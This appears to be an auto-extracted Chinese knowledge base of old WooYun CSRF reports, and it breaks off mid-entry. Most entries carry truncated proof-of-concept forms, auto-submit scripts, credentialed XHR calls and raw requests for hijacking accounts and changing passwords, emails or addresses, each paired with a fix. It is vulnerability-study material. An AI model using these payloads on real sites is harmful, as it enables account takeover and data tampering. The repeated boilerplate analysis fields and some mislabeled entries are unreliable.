# CSRF 漏洞分析

> 自动提取于 2026-01-23 18:57
> 样本数量: 3

## 高频参数
```
  url: 1次
  desc: 1次
  callback: 1次
  get_recent_photos: 1次
  _: 1次
```

## 元思考模式

## 典型案例

### 案例 1: wooyun-2015-0127683
**标题**: 格瓦拉生活网多处CSRF可刷粉，发影评及回复
**原始类型**: 漏洞类型：CSRF
**URL示例**: 
  - `https://example.com/[已脱敏]`
  - `https://example.com/[已脱敏]`
**洞察提取**:
**Payload片段**:
  ```
  orm action="https://example.com/[已脱敏]
  ```
  ```
  orm><script>document.forms[0].submit();</script></bo
  ```
  ```
  <script>document.forms[0].submit();</script></body></html
  ```

### 案例 2: wooyun-2014-051412
**标题**: 某相册服务CSRF保存图片
**原始类型**: 漏洞类型：CSRF
**参数**: `url, desc, callback, get_recent_photos, _`
**URL示例**: 
  - `https://example.com/[已脱敏]`
**洞察提取**:

### 案例 3: wooyun-2014-051292
**标题**: 佳品网CSRF可登陆任意用户漏洞
**原始类型**: 漏洞类型：CSRF


---

## 批次 2 (索引 200-399)
> 样本数量: 2

### 高频参数
```
  m: 1次
  a: 1次
  c: 1次
```

### 典型案例

#### wooyun-2015-0135307
**某IT教育平台某处CSRF**
- Payload: `orm action="https://example.com/[已脱敏]`

#### wooyun-2015-0117987
**爱丽网漏洞小礼包**
- 参数: `m, a, c`
- Payload: `orm action="https://example.com/[已脱敏]`

---

## 批次 3 (索引 400-599)
> 样本: 6

### 高频参数
```
  s_url: 1
  target: 1
  appid: 1
  hln_css: 1
  style: 1
```

### 典型案例

#### wooyun-2015-0122514
**从一个小xss到csrf到某社交空间被刷爆了(一个业务蠕虫的诞生过程/测试已停)**
- 参数: `s_url, target, appid, hln_css, style`
- Payload: `;data=eyJpZCI6Im1hcHNJZF81NThhN`

#### wooyun-2015-0121929
**最佳东方csrf修改账号邮箱**
- Payload: `<script>document.getElementById('post123').submit();</scr`

#### wooyun-2014-048933
**某游戏公司页游存在CSRF漏洞可重置任意用户密码**
- 参数: `newp, newp2, userid`

#### wooyun-2013-041526
**西子论坛CSRF刷粉丝漏洞**
- 参数: `r, uid, _, touid, callback`
- 洞察:
  - 点击关注抓包分析url：https://example.com/[已脱敏]

#### wooyun-2015-0161029
**某商城CSRF修改他人信息**

#### wooyun-2014-076250
**某电视商城csrf设置收货地址**
- Payload: `<script>  document.csrf.submit()</script>`

---

## 批次 4 (索引 600-799)
> 样本: 2

### 高频参数
```
  imageUrl: 1
  special_site: 1
  modulefrom: 1
  keyfrom: 1
  method: 1
```

### 典型案例

#### wooyun-2013-020360
**穷游网CSRF刷粉丝漏洞。**

#### wooyun-2012-08613
**某互联网公司某处CSRF漏洞**
- 参数: `imageUrl, special_site, modulefrom, keyfrom, method`
---
### [wooyun-2012-08606] 爱拍某处CSRF漏洞
**厂商**: 爱拍 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受GET的信息的时候，未对GET来路(Referer)进行验证，同时也没有在GET的信息中加token验证信息的正确性，导致漏洞产生。应用场景，在某些地方，例如YY、论坛、评论，发出这个地址，或者用IMG标签引用这个地址，然后你的粉丝就倍增了~~

**POC**: https://example.com/[已脱敏]]&callback%09=scribeSuccess_new&action=addSubscribe

**绕过**: 直接利用

**修复**: 检查GET来路Referer在GET的信息中加token
---

---
### [wooyun-2015-0126096] 中舞网多处CSRF全部打包
**厂商**: 中舞网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: <html><head><title>poc2.html</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="startdate" value="2015-06-06"><input type="hidden" name="enddate" value="2015-07-07"><input type="hidden" name="companyname" value="%E5%B9%BF%E4%B8%9C%E5%86%B

**绕过**: 直接利用

**修复**: 加上token之类验证
---

---
### [wooyun-2015-093605] 某游戏公司通行证CSRF漏洞危害账户安全
**厂商**: 盛大网络 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先注册个用户登录成功，显示账号资料填写不完整，点击填补资料可以看到需要填写的项目填补资料提交如下数据name=鲁和泰idCard=340304197908257431Birthday=1990-01-01mobile=phone=question1=c_question1=answer1=question2=c_question2=answer2=1203121582Fsubmit=没有验证数据提交来源此时进行利用，csrf代码如下触发代码，即可成功。。

**POC**: csrf代码触发成功后界面再去看通行证，此时显示资料填补完整。如果知道账户名，通过这些资料信息可以直接把密码成功找回。

**绕过**: 直接利用

**修复**: 1，验证信息提交来源，是否来自合法网页；2，在数据字段要隐式添加hash值，验证数据是否合法
---

---
### [wooyun-2011-02161] 人人网GET方式提交状态漏洞
**厂商**: 人人网 | **年份**: 2011 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 暗恋：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 将GET方式改为POST方式
---

---
### [wooyun-2015-0121174] 利用CSRF漏洞劫持会员账号
**厂商**: 贝贝网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 首先我们先让用户中招绑定上我的某邮箱服务，我写了一个SCRF。代码如下：<html><head><title>scr poc</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="hxcsrf" value="47c1bdc32e559d7774e220a3c2427d43"><input type="hidden" name="email" value="953837476%40某域名.com"></fo

**绕过**: 直接利用

**修复**: 修复一下CSRF吧。
---

---
### [wooyun-2015-0163147] 爱卡汽车两处问题(绑定账号与任意解绑定)
**厂商**: 爱卡汽车网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题1：账号注入后，绑定OAuth时，无token验证，存在csrf。而且此处应加入state参数。相关问题修复看https://example.com/[已脱敏] 的 “针对应用方csrf劫持第三方账号” 章节。问题2：手机解除绑定操作可以被暴力破解，添加验证码解决。

**POC**: 问题1证明：无token或者state保护，存在csrf。问题2证明：解绑定手机无验证码判断，存在暴力破解问题

**绕过**: 直接利用

**修复**: 漏洞1：相关问题修复看https://example.com/[已脱敏] 的 “针对应用方csrf劫持第三方账号” 章节。具体修复参考漏洞2：添加提交code时的验证码检查功能
---

---
### [wooyun-2015-0107723] ESPCMS后台CSRF修改管理密码
**厂商**: 易思ESPCMS企业网站管理系统 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改管理员密码没有验证原密码 我也是醉了 抓包没有token值验证 构造表单试试？ok啊 可以修改啊表单构造好了，但是修改好了之后随便不会提示修改了密码，但是会自动跳转到后台，这样就会被管理员发现或者产生怀疑了~~肿么破？？？我们利用回旋镖~我们新建一个html，代码如下<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>乌云测试</h1></td></tr></tbody></table><<meta http-equi

**POC**: 修改管理员密码没有验证原密码 我也是醉了 抓包没有token值验证 构造表单试试？ok啊 可以修改啊表单构造好了，但是修改好了之后随便不会提示修改了密码，但是会自动跳转到后台，这样就会被管理员发现或者产生怀疑了~~肿么破？？？我们利用回旋镖~我们新建一个html，代码如下<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="colo

**绕过**: 直接利用

**修复**: 你懂的修改时需要验证原密码即可
---

---
### [wooyun-2016-0180311] 某社交平台论坛CSRF打包及危害说明（多个子论坛通用）
**厂商**: 某社交平台 | **年份**: 2016 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此漏洞涉及到的某社交平台子论坛包括但不限于以下站点星座 https://example.com/[已脱敏]     b4201dfd数码 https://example.com/[已脱敏]      b4201dfd百味 https://example.com/[已脱敏]      b4201dfd生活 https://example.com/[已脱敏]      b4201dfd女性 https://example.com/[已脱敏]   4788b761历史 https://example.com/[已脱敏]   b4201dfd军事 https://example.com/[已脱敏]  b4201dfd体育 https://example.com/[已脱敏]      b4201dfd亲子 http://

**POC**: 以亲子论坛为例，时间有限只测试了四个位置，估计整个论坛都没有做csrf的防护，其他重要位置还请自行检测^_^1 修改用户信息<form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="formhash" value="aec0506d" /><input type="hidden" name="nicknamenew" value="GAY21888" /><input type="hidden" name="gend

**绕过**: 直接利用

**修复**: 你们更专业！
---

---
### [wooyun-2014-080964] 某社交平台某社交平台某处小功能存在CSRF漏洞（可修改用户某社交平台某元素）
**厂商**: 某社交平台某社交平台 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 新版某社交平台出了一个小功能（类似某社交空间一样），就是可以设置背景音乐。通过抓包后得知背景音乐某首歌的URL为：https://example.com/[已脱敏] 后面token我理解为都是这首歌的。。直接点击上面的URL就可以看到在你个人页面左边有个背景音乐了：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2010-0640] 某社交平台CSRF
**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 恶意攻击者可构造恶意表单，并骗取受害者点击，当受害者点击链接时，会以受害者的名义产生一条某社交平台信息，此方法可产生蠕虫，非常严重。

**POC**: 测试方法：1、将下列表单存储成index.html,放在本地目录下，将183.174.39.46换成你自己的ip。<form name="CSRF" method="POST" name="form0" action="https://example.com/[已脱敏]"><input type="hidden" name="status" value="http://[IP已脱敏] type="hidden" name="in_reply_to_status_id" value="sendinfo"/><input

**绕过**: 直接利用

**修复**: 对referer和token进行验证。
---

---
### [wooyun-2015-0113965] 我是如何在珍爱网刷关注的
**厂商**: 珍爱网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 从上图可看到，他关注是通过/v2/follow/addFollow.do这个文件下面的，objectId="+关注ID"可以看到我现在是处于还没关注状态。现在我们来构造一下一个地址吧url：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 虽然危害性不大，但是这也算是漏洞了吧。不关注你们就不会去挖你们的洞了
---

---
### [wooyun-2015-0158002] 某运营商山西某分站彩铃服务任意号码注册(可直接开通业务)
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞页：http://**.**.**.**/user/register.screen无验证码，试了一下，验证码无时间限制当 手机验证码输入成功，直接开通业务。。。（拿朋友的手机试的。。。感觉他会杀了我。。。）坑啊（我终于知道我手机以前为什么会无缘无故开通彩铃业务了）！POST /user/useropenaccount.do HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Acc

**POC**: 漏洞页：http://**.**.**.**/user/register.screen无验证码，试了一下，验证码无时间限制当 手机验证码输入成功，直接开通业务。。。（拿朋友的手机试的。。。感觉他会杀了我。。。）坑啊（我终于知道我手机以前为什么会无缘无故开通彩铃业务了）！POST /user/useropenaccount.do HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,applicat

**绕过**: 直接利用

**修复**: 加验证码，手机验证码加时间限制
---

---
### [wooyun-2015-0162476] 点我的链接我就可能会进入你的知乎账号
**厂商**: 知乎 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 知乎的绑定某社交平台登陆的请求为https://example.com/[已脱敏]

**POC**: 已录视频https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
---

---
### [wooyun-2012-08531] 某社交平台某社交平台某处CSRF漏洞
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: GET模式，所以自评15在接受GET的信息的时候，未对GET来路(Referer)进行验证，同时也没有在GET的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] （GET模式）<html><body><form id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="get"><input type="text" name="do" value="updateweibo" /><input type="text" name="content" value="XXXXX" /

**绕过**: 直接利用

**修复**: 检查GET来路Referer在GET的信息中加token
---

---
### [wooyun-2013-042094] 某云盘某功能存在csrf漏洞
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某云盘群组解散处存在csrf，可导致共享群解散，文件丢失

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0123458] 香舍网 CSRF漏洞一枚，可随意修改他人收货地址
**厂商**: 香舍网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录账户A。，修改其收货地址，并抓包查看其收货地址,修改成功;可以看到，修改收货请求为post请求，同时，一切参数均是可预测（AddressId、UserId均是以1自然升序，完全可遍历猜测！）。猜测存在csrf，便去试一把。。。构造csrfxiangshe.htmlxmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("MAddressInfo.AddressId=92589&MAddressInfo.UserId=150936&MAddressInfo.T

**POC**: 同上

**绕过**: 直接利用

**修复**: 增加token
---

---
### [wooyun-2015-0136605] 逛(guang.com)存在csrf可修改他人基本信息
**厂商**: 逛(guang.com) | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改个人信息，抓包查看：可以看到无不可预测参数，故伪造恶意链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickname=woo123232&sex=male&year=1982&month=1&day=1&province=1&city=1&blog=http%3A%2F%2F11aaaa.com&intro=xsacd32fdsgfsd365");访问链接成功，信息已被修改。修改前后效果对比图：

**POC**: 同上

**绕过**: 直接利用

**修复**: 添加token验证referer
---

---
### [wooyun-2010-0884] 饭否发帖CSRF漏洞
**厂商**: 饭否 | **年份**: 2010 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 饭否的手机版和IPHONE版均可在PC上访问，发帖时虽然有token，但经测试，是个摆设，reffer虽有限制，但可以通过https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2011-03848] 织梦CMS系统 - 游客无限刷顶踩数值
**厂商**: 织梦CMS系统 | **年份**: 2011 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 虽然前端页面做了 游客 只能提交一次的限制，但是直接以URL访问则没有限制，只要按着F5不放，一会就能上百上千。。。。而且dede的官方也木有做这方面的限制。。。你懂的

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 对 feedback.php 文件加入判断 单个IP提交次数与提交时间间隔限制。不管换不换IP，一条IP记录保存24小时，到时间清除。
---

---
### [wooyun-2015-0127940] 酒美网存在csrf漏洞
**厂商**: 酒美网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改用户基本资料，抓包：修改成功：伪造恶意链接，可以看到修改用户资料的请求为get请求，故浏览器可直接访问该链接（此url地址由上面修改资料的请求得来）：https://example.com/[已脱敏]

**POC**: 已证明

**绕过**: 直接利用

**修复**: 验证referer加token
---

---
### [wooyun-2014-067529] 某视频网站一键劫持妹子通行证
**厂商**: 某门户网站 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某视频网站可以设置某门户网站通行证手机号绑定。https://example.com/[已脱敏] /user/a/mobile/checkCode.do?m=13811110000&mcode=1234&t=3 HTTP/1.1ajax验证通过后，点击绑定。提交绑定请求。绑定请求中会重新提交手机号码和验证码。而服务器获取动态验证码时并未将此手机号、验证码、账号三者进行关联，导致只要验证码与手机号匹配，此手机号可以与别的账号进行绑定。并且最终绑定链接没有CSRF防护。https://example.com/[已脱敏]

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 获取动态验证码时服务端记录当前用户、手机号、验证码。绑定时验证这三者是否匹配。
---

---
### [wooyun-2013-037678] 爱丽网两处缺陷（csrf等）
**厂商**: aili.com | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 任意关注csrf抓包数据：POST /index.php?m=content&c=goods&a=addAttention HTTP/1.1Host: show.aili.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:23.0) Gecko/20100101 Firefox/23.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urle

**绕过**: 直接利用

**修复**: 1：乌云知识库看下2：加个验证码
---

---
### [wooyun-2013-041633] 58分站同城csrf用户多比较容易中标
**厂商**: 58同城 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 没什么好证明的，一个美女图片加一个img伪装的csrf，还是get，还是你们网站的域名开头，例如： 这是我妹妹XXX，挺漂亮的。

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2011-01656] 多玩YY语音设置频道密码CSRF
**厂商**: 广州多玩 | **年份**: 2011 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 前提 该频道未设置频道密码sid=频道IDnewPassword=要设的频道密码https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0100232] 某高校邮件账号泄漏（github）
**厂商**: sjtu.edu.cn | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 更改密码
---

---
### [wooyun-2015-0135900] 云路课堂某处存在CSRF漏洞（可修改用户密码）
**厂商**: yun.lu | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 绑定邮箱处没有tokenPOC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="email" value="wooyun1&#64;163&#46;com" /><input type="submit" value="Submit request" /></form></body></html>

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0119813] 返还网漏洞礼包一个
**厂商**: 返还网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 修改资料保存处抓包，请求数据我就不贴上了，是一个get提交的，直接构造一个URL就行了，也可以构造一个表单，我们就构造一个URL。我构造的URL如下：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加上如token等验证。
---

---
### [wooyun-2014-060650] 畅想听吧csrf刷留言
**厂商**: cxt8.com | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] alt="" _xhe_src="https://example.com/[已脱敏]" src="https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤啊！
---

---
### [wooyun-2015-0133493] 特定条件下让会员访问即可关注任意主播
**厂商**: douyu.tv | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天调试了一下斗鱼整体界面..发现房间的关注按钮有点不科学, 居然是GET方式增加关注随意找了一个房间(房间ID 253763)是一个妹子哟~构造成<img src="https://example.com/[已脱敏]" />接下来该怎么利用?找一个观众多的主播, 社工下他的号在编辑器插入HTML代码<img src="https://example.com/[已脱敏]" />即可

**POC**: 某过万主播观众数往直播详情插的img下面是女主播的观众数增加速度0 0开始前:发此漏洞的时候

**绕过**: 直接利用

**修复**: 增加验证吧~
---

---
### [wooyun-2013-019188] 某社交平台CSRF刷粉丝漏洞
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 两个接口都存在问题https://example.com/[已脱敏] 但是，本来是POST的接口，却可以响应GET请求刚好data.weibo.com的首页就有某社交平台， 只要在这里评论， 或者发新某社交平台， 别人点击即可触发同时还可以删除粉丝， 链接里面action=create改成action=destory即可

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 去掉GET方法
---

---
### [wooyun-2013-038379] easytalkCSRF可蠕虫发某社交平台
**厂商**: nextsns.com | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: easytalkCSRF可蠕虫发某社交平台可用于各个方面，例如广告传销，一发不可收拾

**POC**: 抓包得：POST /?m=space&a=sendmsg HTTP/1.1Host: t.nextsns.comConnection: Keep-AliveContent-Length: 51Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; SE 2.X MetaSr 1.0)accept-language: zh-cncontent-type: applicati

**绕过**: 直接利用

**修复**: 加token.
---

---
### [wooyun-2015-0118671] 某社区CSRF发送留言
**厂商**: 某门户网站 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某门户网站留言功能验证不严，虽然设置了postkey但并未生效（图中cookie暂时删除，发包时还原了。）删除key继续发包，然后。。

**POC**: POC：<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="back&#95;encode" value="manage&#95;message&#46;php&#63;states&#61;0&amp;offset&#61;0" /><input type="hidden" name="receiveCN" value="baobaosb999" /><input type="hidden" name="

**绕过**: 直接利用

**修复**: 验证postcode
---

---
### [wooyun-2013-040214] UC某游戏开放平台CSRF劫持用户账号
**厂商**: UC Mobile | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=gb2312"></head><body><form id="letv" name="letv" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="newEmail" value="1234567@某域名.com" /><input type="text" name="_respType" value="json" /><

**绕过**: 直接利用

**修复**: 可参考乌云知识库里的文章，进行token、referer等防御
---

---
### [wooyun-2012-08610] 某门户网站某处CSRF漏洞
**厂商**: 某门户网站 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 配合前两个CSRF使用，效果更加，哈哈。WooYun: 某门户网站某处CSRF漏洞WooYun: 某门户网站某处CSRF漏洞在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="act" value="follow" /><input type="text" name="friendids" value="23117291" /><input type="text" name="uid" value="23117291" />

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2014-063574] nano云存储严重的CSRF漏洞可以针对性攻击
**厂商**: 某技术公司 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此图可以看出来直接两次新密码就可以搞定，至少添加一个旧密码这个是测试代码，测试成功短时间内发现这几个，感觉存在的问题很多。

**POC**: 这个图基本就看出来问题了这个是测试代码，测试成功列举几个漏洞列表

**绕过**: 直接利用

**修复**: 所有的http请求都要添加验证的。开发web管理的成员应该懂这个的，要是不懂的话就回家吧
---

---
### [wooyun-2013-021321] Linksys EA2700的密码更改认证缺陷和CSRF漏洞
**厂商**: Linksys | **年份**: 2013 | **类型**: 权限控制绕过

**元思考**: 触发信号: 功能测试

**洞察**: 权限控制绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别权限控制绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Linksys EA2700路由器，在同一网络上的人都可以用远程管理改变路由器的密码。这可以从互联网上访问此路由器的网络。CSRF攻击！只需发送POST请求到apply.cgi，将开启远程管理和更改管理员密码。

**POC**: POST /apply.cgi HTTP/1.1Host: [IP已脱敏]User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveCont

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0117369] 有缘网CSRF礼包一个
**厂商**: 有缘网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

